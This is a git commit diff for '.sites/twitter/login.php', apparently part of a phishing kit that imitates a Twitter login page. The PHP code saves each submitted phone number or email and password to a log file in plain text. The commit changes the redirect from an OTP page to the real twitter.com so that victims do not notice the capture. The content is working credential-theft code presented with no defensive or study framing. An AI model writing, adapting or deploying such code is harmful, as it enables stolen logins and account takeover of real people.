51bd34759e49242f8da44f031c0a3560baddc895
nullnull <77673744+redirect-twitter@users.noreply.github.com>
2023-10-12 19:16:32 +0900

    login.php

--- .sites/twitter/login.php
+++ .sites/twitter/login.php
@@ -1,5 +1,5 @@
 <?php
 
     file_put_contents("log.txt", "Email: " . $_POST['phone_or_email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: otp.php');
+header('Location: https://twitter.com');
 exit();
